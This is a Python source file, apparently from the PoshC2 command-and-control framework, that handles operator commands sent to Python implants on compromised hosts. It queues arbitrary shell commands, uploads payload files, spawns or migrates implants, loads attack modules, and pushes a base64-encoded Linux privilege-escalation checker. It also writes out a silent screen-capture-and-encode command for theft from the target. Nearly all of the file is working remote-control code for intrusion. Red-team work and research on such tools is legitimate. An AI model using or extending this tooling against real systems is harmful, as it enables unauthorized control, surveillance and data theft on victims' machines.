import base64, re, traceback, os
from poshc2.client.Alias import py_alias
from poshc2.Colours import Colours
from poshc2.Utils import argp
from poshc2.server.AutoLoads import check_module_loaded
from poshc2.client.Help import py_help1
from poshc2.server.Config import ModulesDirectory, PayloadsDirectory, PoshProjectDirectory, DatabaseType
from poshc2.server.Core import print_bad
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style
from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter


if DatabaseType.lower() == "postgres":
    from poshc2.server.database.DBPostgres import new_task, kill_implant, get_implantdetails, get_pid
else:
    from poshc2.server.database.DBSQLite import new_task, kill_implant, get_implantdetails, get_pid


def handle_py_command(command, user, randomuri, implant_id):

    command = command.strip()

    # alias mapping
    for alias in py_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]

    if command.startswith("searchhelp"):
        do_searchhelp(user, command, randomuri)
        return
    elif command.startswith("searchhistory"):
        do_searchhistory(user, command, randomuri)
        return        
    elif command == "listmodules":
        do_listmodules(user, command, randomuri)
        return
    elif command == 'sai' or command == 'migrate':
        do_startanotherimplant(user, command, randomuri)
        return
    elif command.startswith("upload-file"):
        do_upload_file(user, command, randomuri)
        return
    elif command == "help":
        print(py_help1)
        return
    elif command.startswith("loadmoduleforce"):
        do_loadmoduleforce(user, command, randomuri)
        return
    elif command.startswith("loadmodule"):
        do_loadmodule(user, command, randomuri)
        return
    elif command.startswith("get-screenshot"):
        do_get_screenshot(user, command, randomuri)
        return
    elif command == "kill-implant" or command == "exit":
        do_kill_implant(user, command, randomuri)
        return
    elif command.startswith("linuxprivchecker"):
        do_linuxprivchecker(user, command, randomuri)
        return
    else:
        if command:
            do_shell(user, command, randomuri)
        return


def do_searchhistory(user, command, randomuri):
    searchterm = (command).replace("searchhistory ", "")
    with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
        for line in hisfile:
            if searchterm in line.lower():
                print(Colours.GREEN + line.replace("+",""))


def do_searchhelp(user, command, randomuri):
    searchterm = (command).replace("searchhelp ", "")
    helpful = py_help1.split('\n')
    for line in helpful:
        if searchterm in line.lower():
            print(Colours.GREEN + line)


def do_listmodules(user, command, randomuri):
    modules = os.listdir(ModulesDirectory)
    modules = sorted(modules, key=lambda s: s.lower())
    print("")
    print("[+] Available modules:")
    print("")
    for mod in modules:
        if ".py" in mod:
            print(mod)


def do_startanotherimplant(user, command, randomuri):
    new_task('startanotherimplant', user, randomuri)


def do_sai(user, command, randomuri):
    do_startanotherimplant(user, command, randomuri)


def do_migrate(user, command, randomuri):
    do_startanotherimplant(user, command, randomuri)


def do_upload_file(user, command, randomuri):
    source = ""
    destination = ""
    if command == "upload-file":
        style = Style.from_dict({
            '': '#80d130',
        })
        session = PromptSession(history=FileHistory('%s/.upload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
        try:
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        except KeyboardInterrupt:
            return
        while not os.path.isfile(source):
            print("File does not exist: %s" % source)
            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        destination = session.prompt("Location to upload to: ")
    else:
        args = argp(command)
        source = args.source
        destination = args.destination
    try:

        destination = destination.replace("\\", "\\\\")
        print("")
        print("Uploading %s to %s" % (source, destination))
        uploadcommand = f"upload-file {source} {destination}"
        new_task(uploadcommand, user, randomuri)
    except Exception as e:
        print("Error with source file: %s" % e)
        traceback.print_exc()


def do_help(user, command, randomuri):
    print(py_help1)


def do_loadmoduleforce(user, command, randomuri):
    params = re.compile("loadmoduleforce ", re.IGNORECASE)
    params = params.sub("", command)
    check_module_loaded(params, randomuri, user, force=True)


def do_loadmodule(user, command, randomuri):
    params = re.compile("loadmodule ", re.IGNORECASE)
    params = params.sub("", command)
    check_module_loaded(params, randomuri, user)


def do_get_screenshot(user, command, randomuri):
    taskcmd = "screencapture -x /tmp/s;base64 /tmp/s;rm /tmp/s"
    new_task(taskcmd, user, randomuri)


def do_kill_implant(user, command, randomuri):
    impid = get_implantdetails(randomuri)
    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
    if ri.lower() == "n":
        print("Implant not terminated")
    if ri == "":
        pid = get_pid(randomuri)
        new_task("kill -9 %s" % pid, user, randomuri)
        kill_implant(randomuri)
    if ri.lower() == "y":
        pid = get_pid(randomuri)
        new_task("kill -9 %s" % pid, user, randomuri)
        kill_implant(randomuri)


def do_exit(user, command, randomuri):
    return do_kill_implant(user, command, randomuri)


def do_linuxprivchecker(user, command, randomuri):
    params = re.compile("linuxprivchecker", re.IGNORECASE)
    params = params.sub("", command)
    module = open("%slinuxprivchecker.py" % ModulesDirectory, 'rb').read()
    encoded_module = base64.b64encode(module).decode("utf-8")
    taskcmd = "linuxprivchecker -pycode %s %s" % (encoded_module, params)
    new_task(taskcmd, user, randomuri)


def do_shell(user, command, randomuri):
    new_task(command, user, randomuri)
